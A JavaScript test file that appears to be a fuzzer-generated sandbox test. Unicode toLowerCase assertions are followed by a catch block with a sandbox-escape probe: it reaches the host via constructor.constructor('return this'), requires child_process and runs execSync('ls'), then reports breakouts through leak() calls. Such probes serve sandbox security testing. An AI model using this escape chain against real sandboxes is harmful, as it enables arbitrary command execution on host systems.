try {
    assert.sameValue('ß'.toLowerCase(), 'ß', 'LATIN SMALL LETTER SHARP S');
    assert.sameValue('İ'.toLowerCase(), 'i̇', 'LATIN CAPITAL LETTER I WITH DOT ABOVE');
    assert.sameValue('ﬀ'.toLowerCase(), 'ﬀ', 'LATIN SMALL LIGATURE FF');
    assert.sameValue('ﬁ'.toLowerCase(), 'ﬁ', 'LATIN SMALL LIGATURE FI');
    assert.sameValue('ﬂ'.toLowerCase(), 'ﬂ', 'LATIN SMALL LIGATURE FL');
    assert.sameValue('ﬃ'.toLowerCase(), 'ﬃ', 'LATIN SMALL LIGATURE FFI');
    assert.sameValue('ﬄ'.toLowerCase(), 'ﬄ', 'LATIN SMALL LIGATURE FFL');
    assert.sameValue('ﬅ'.toLowerCase(), 'ﬅ', 'LATIN SMALL LIGATURE LONG S T');
    assert.sameValue('ﬆ'.toLowerCase(), 'ﬆ', 'LATIN SMALL LIGATURE ST');
    assert.sameValue('և'.toLowerCase(), 'և', 'ARMENIAN SMALL LIGATURE ECH YIWN');
    assert.sameValue('ﬓ'.toLowerCase(), 'ﬓ', 'ARMENIAN SMALL LIGATURE MEN NOW');
    assert.sameValue('ﬔ'.toLowerCase(), 'ﬔ', 'ARMENIAN SMALL LIGATURE MEN ECH');
    assert.sameValue('ﬕ'.toLowerCase(), 'ﬕ', 'ARMENIAN SMALL LIGATURE MEN INI');
    assert.sameValue('ﬖ'.toLowerCase(), 'ﬖ', 'ARMENIAN SMALL LIGATURE VEW NOW');
    assert.sameValue('ﬗ'.toLowerCase(), 'ﬗ', 'ARMENIAN SMALL LIGATURE MEN XEH');
    assert.sameValue('ŉ'.toLowerCase(), 'ŉ', 'LATIN SMALL LETTER N PRECEDED BY APOSTROPHE');
    assert.sameValue('ΐ'.toLowerCase(), 'ΐ', 'GREEK SMALL LETTER IOTA WITH DIALYTIKA AND TONOS');
    assert.sameValue('ΰ'.toLowerCase(), 'ΰ', 'GREEK SMALL LETTER UPSILON WITH DIALYTIKA AND TONOS');
    assert.sameValue('ǰ'.toLowerCase(), 'ǰ', 'LATIN SMALL LETTER J WITH CARON');
    assert.sameValue('ẖ'.toLowerCase(), 'ẖ', 'LATIN SMALL LETTER H WITH LINE BELOW');
    assert.sameValue('ẗ'.toLowerCase(), 'ẗ', 'LATIN SMALL LETTER T WITH DIAERESIS');
    assert.sameValue('ẘ'.toLowerCase(), 'ẘ', 'LATIN SMALL LETTER W WITH RING ABOVE');
    assert.sameValue('ẙ'.toLowerCase(), 'ẙ', 'LATIN SMALL LETTER Y WITH RING ABOVE');
    assert.sameValue('ẚ'.toLowerCase(), 'ẚ', 'LATIN SMALL LETTER A WITH RIGHT HALF RING');
    assert.sameValue('ὐ'.toLowerCase(), 'ὐ', 'GREEK SMALL LETTER UPSILON WITH PSILI');
    assert.sameValue('ὒ'.toLowerCase(), 'ὒ', 'GREEK SMALL LETTER UPSILON WITH PSILI AND VARIA');
    assert.sameValue('ὔ'.toLowerCase(), 'ὔ', 'GREEK SMALL LETTER UPSILON WITH PSILI AND OXIA');
    assert.sameValue('ὖ'.toLowerCase(), 'ὖ', 'GREEK SMALL LETTER UPSILON WITH PSILI AND PERISPOMENI');
    assert.sameValue('ᾶ'.toLowerCase(), 'ᾶ', 'GREEK SMALL LETTER ALPHA WITH PERISPOMENI');
    assert.sameValue('ῆ'.toLowerCase(), 'ῆ', 'GREEK SMALL LETTER ETA WITH PERISPOMENI');
    assert.sameValue('ῒ'.toLowerCase(), 'ῒ', 'GREEK SMALL LETTER IOTA WITH DIALYTIKA AND VARIA');
    assert.sameValue('ΐ'.toLowerCase(), 'ΐ', 'GREEK SMALL LETTER IOTA WITH DIALYTIKA AND OXIA');
    assert.sameValue('ῖ'.toLowerCase(), 'ῖ', 'GREEK SMALL LETTER IOTA WITH PERISPOMENI');
    assert.sameValue('ῗ'.toLowerCase(), 'ῗ', 'GREEK SMALL LETTER IOTA WITH DIALYTIKA AND PERISPOMENI');
    assert.sameValue('ῢ'.toLowerCase(), 'ῢ', 'GREEK SMALL LETTER UPSILON WITH DIALYTIKA AND VARIA');
    assert.sameValue('ΰ'.toLowerCase(), 'ΰ', 'GREEK SMALL LETTER UPSILON WITH DIALYTIKA AND OXIA');
    assert.sameValue('ῤ'.toLowerCase(), 'ῤ', 'GREEK SMALL LETTER RHO WITH PSILI');
    assert.sameValue('ῦ'.toLowerCase(), 'ῦ', 'GREEK SMALL LETTER UPSILON WITH PERISPOMENI');
    assert.sameValue('ῧ'.toLowerCase(), 'ῧ', 'GREEK SMALL LETTER UPSILON WITH DIALYTIKA AND PERISPOMENI');
    assert.sameValue('ῶ'.toLowerCase(), 'ῶ', 'GREEK SMALL LETTER OMEGA WITH PERISPOMENI');
    assert.sameValue('ᾀ'.toLowerCase(), 'ᾀ', 'GREEK SMALL LETTER ALPHA WITH PSILI AND YPOGEGRAMMENI');
    assert.sameValue('ᾁ'.toLowerCase(), 'ᾁ', 'GREEK SMALL LETTER ALPHA WITH DASIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾂ'.toLowerCase(), 'ᾂ', 'GREEK SMALL LETTER ALPHA WITH PSILI AND VARIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾃ'.toLowerCase(), 'ᾃ', 'GREEK SMALL LETTER ALPHA WITH DASIA AND VARIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾄ'.toLowerCase(), 'ᾄ', 'GREEK SMALL LETTER ALPHA WITH PSILI AND OXIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾅ'.toLowerCase(), 'ᾅ', 'GREEK SMALL LETTER ALPHA WITH DASIA AND OXIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾆ'.toLowerCase(), 'ᾆ', 'GREEK SMALL LETTER ALPHA WITH PSILI AND PERISPOMENI AND YPOGEGRAMMENI');
    assert.sameValue('ᾇ'.toLowerCase(), 'ᾇ', 'GREEK SMALL LETTER ALPHA WITH DASIA AND PERISPOMENI AND YPOGEGRAMMENI');
    assert.sameValue('ᾈ'.toLowerCase(), 'ᾀ', 'GREEK CAPITAL LETTER ALPHA WITH PSILI AND PROSGEGRAMMENI');
    assert.sameValue('ᾉ'.toLowerCase(), 'ᾁ', 'GREEK CAPITAL LETTER ALPHA WITH DASIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾊ'.toLowerCase(), 'ᾂ', 'GREEK CAPITAL LETTER ALPHA WITH PSILI AND VARIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾋ'.toLowerCase(), 'ᾃ', 'GREEK CAPITAL LETTER ALPHA WITH DASIA AND VARIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾌ'.toLowerCase(), 'ᾄ', 'GREEK CAPITAL LETTER ALPHA WITH PSILI AND OXIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾍ'.toLowerCase(), 'ᾅ', 'GREEK CAPITAL LETTER ALPHA WITH DASIA AND OXIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾎ'.toLowerCase(), 'ᾆ', 'GREEK CAPITAL LETTER ALPHA WITH PSILI AND PERISPOMENI AND PROSGEGRAMMENI');
    assert.sameValue('ᾏ'.toLowerCase(), 'ᾇ', 'GREEK CAPITAL LETTER ALPHA WITH DASIA AND PERISPOMENI AND PROSGEGRAMMENI');
    assert.sameValue('ᾐ'.toLowerCase(), 'ᾐ', 'GREEK SMALL LETTER ETA WITH PSILI AND YPOGEGRAMMENI');
    assert.sameValue('ᾑ'.toLowerCase(), 'ᾑ', 'GREEK SMALL LETTER ETA WITH DASIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾒ'.toLowerCase(), 'ᾒ', 'GREEK SMALL LETTER ETA WITH PSILI AND VARIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾓ'.toLowerCase(), 'ᾓ', 'GREEK SMALL LETTER ETA WITH DASIA AND VARIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾔ'.toLowerCase(), 'ᾔ', 'GREEK SMALL LETTER ETA WITH PSILI AND OXIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾕ'.toLowerCase(), 'ᾕ', 'GREEK SMALL LETTER ETA WITH DASIA AND OXIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾖ'.toLowerCase(), 'ᾖ', 'GREEK SMALL LETTER ETA WITH PSILI AND PERISPOMENI AND YPOGEGRAMMENI');
    assert.sameValue('ᾗ'.toLowerCase(), 'ᾗ', 'GREEK SMALL LETTER ETA WITH DASIA AND PERISPOMENI AND YPOGEGRAMMENI');
    assert.sameValue('ᾘ'.toLowerCase(), 'ᾐ', 'GREEK CAPITAL LETTER ETA WITH PSILI AND PROSGEGRAMMENI');
    assert.sameValue('ᾙ'.toLowerCase(), 'ᾑ', 'GREEK CAPITAL LETTER ETA WITH DASIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾚ'.toLowerCase(), 'ᾒ', 'GREEK CAPITAL LETTER ETA WITH PSILI AND VARIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾛ'.toLowerCase(), 'ᾓ', 'GREEK CAPITAL LETTER ETA WITH DASIA AND VARIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾜ'.toLowerCase(), 'ᾔ', 'GREEK CAPITAL LETTER ETA WITH PSILI AND OXIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾝ'.toLowerCase(), 'ᾕ', 'GREEK CAPITAL LETTER ETA WITH DASIA AND OXIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾞ'.toLowerCase(), 'ᾖ', 'GREEK CAPITAL LETTER ETA WITH PSILI AND PERISPOMENI AND PROSGEGRAMMENI');
    assert.sameValue('ᾟ'.toLowerCase(), 'ᾗ', 'GREEK CAPITAL LETTER ETA WITH DASIA AND PERISPOMENI AND PROSGEGRAMMENI');
    assert.sameValue('ᾠ'.toLowerCase(), 'ᾠ', 'GREEK SMALL LETTER OMEGA WITH PSILI AND YPOGEGRAMMENI');
    assert.sameValue('ᾡ'.toLowerCase(), 'ᾡ', 'GREEK SMALL LETTER OMEGA WITH DASIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾢ'.toLowerCase(), 'ᾢ', 'GREEK SMALL LETTER OMEGA WITH PSILI AND VARIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾣ'.toLowerCase(), 'ᾣ', 'GREEK SMALL LETTER OMEGA WITH DASIA AND VARIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾤ'.toLowerCase(), 'ᾤ', 'GREEK SMALL LETTER OMEGA WITH PSILI AND OXIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾥ'.toLowerCase(), 'ᾥ', 'GREEK SMALL LETTER OMEGA WITH DASIA AND OXIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾦ'.toLowerCase(), 'ᾦ', 'GREEK SMALL LETTER OMEGA WITH PSILI AND PERISPOMENI AND YPOGEGRAMMENI');
    assert.sameValue('ᾧ'.toLowerCase(), 'ᾧ', 'GREEK SMALL LETTER OMEGA WITH DASIA AND PERISPOMENI AND YPOGEGRAMMENI');
    assert.sameValue('ᾨ'.toLowerCase(), 'ᾠ', 'GREEK CAPITAL LETTER OMEGA WITH PSILI AND PROSGEGRAMMENI');
    assert.sameValue('ᾩ'.toLowerCase(), 'ᾡ', 'GREEK CAPITAL LETTER OMEGA WITH DASIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾪ'.toLowerCase(), 'ᾢ', 'GREEK CAPITAL LETTER OMEGA WITH PSILI AND VARIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾫ'.toLowerCase(), 'ᾣ', 'GREEK CAPITAL LETTER OMEGA WITH DASIA AND VARIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾬ'.toLowerCase(), 'ᾤ', 'GREEK CAPITAL LETTER OMEGA WITH PSILI AND OXIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾭ'.toLowerCase(), 'ᾥ', 'GREEK CAPITAL LETTER OMEGA WITH DASIA AND OXIA AND PROSGEGRAMMENI');
    assert.sameValue('ᾮ'.toLowerCase(), 'ᾦ', 'GREEK CAPITAL LETTER OMEGA WITH PSILI AND PERISPOMENI AND PROSGEGRAMMENI');
    assert.sameValue('ᾯ'.toLowerCase(), 'ᾧ', 'GREEK CAPITAL LETTER OMEGA WITH DASIA AND PERISPOMENI AND PROSGEGRAMMENI');
    assert.sameValue('ᾳ'.toLowerCase(), 'ᾳ', 'GREEK SMALL LETTER ALPHA WITH YPOGEGRAMMENI');
    assert.sameValue('ᾼ'.toLowerCase(), 'ᾳ', 'GREEK CAPITAL LETTER ALPHA WITH PROSGEGRAMMENI');
    assert.sameValue('ῃ'.toLowerCase(), 'ῃ', 'GREEK SMALL LETTER ETA WITH YPOGEGRAMMENI');
    assert.sameValue('ῌ'.toLowerCase(), 'ῃ', 'GREEK CAPITAL LETTER ETA WITH PROSGEGRAMMENI');
    assert.sameValue('ῳ'.toLowerCase(), 'ῳ', 'GREEK SMALL LETTER OMEGA WITH YPOGEGRAMMENI');
    assert.sameValue('ῼ'.toLowerCase(), 'ῳ', 'GREEK CAPITAL LETTER OMEGA WITH PROSGEGRAMMENI');
    assert.sameValue('ᾲ'.toLowerCase(), 'ᾲ', 'GREEK SMALL LETTER ALPHA WITH VARIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾴ'.toLowerCase(), 'ᾴ', 'GREEK SMALL LETTER ALPHA WITH OXIA AND YPOGEGRAMMENI');
    assert.sameValue('ῂ'.toLowerCase(), 'ῂ', 'GREEK SMALL LETTER ETA WITH VARIA AND YPOGEGRAMMENI');
    assert.sameValue('ῄ'.toLowerCase(), 'ῄ', 'GREEK SMALL LETTER ETA WITH OXIA AND YPOGEGRAMMENI');
    assert.sameValue('ῲ'.toLowerCase(), 'ῲ', 'GREEK SMALL LETTER OMEGA WITH VARIA AND YPOGEGRAMMENI');
    assert.sameValue('ῴ'.toLowerCase(), 'ῴ', 'GREEK SMALL LETTER OMEGA WITH OXIA AND YPOGEGRAMMENI');
    assert.sameValue('ᾷ'.toLowerCase(), 'ᾷ', 'GREEK SMALL LETTER ALPHA WITH PERISPOMENI AND YPOGEGRAMMENI');
    assert.sameValue('ῇ'.toLowerCase(), 'ῇ', 'GREEK SMALL LETTER ETA WITH PERISPOMENI AND YPOGEGRAMMENI');
    assert.sameValue('ῷ'.toLowerCase(), 'ῷ', 'GREEK SMALL LETTER OMEGA WITH PERISPOMENI AND YPOGEGRAMMENI');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}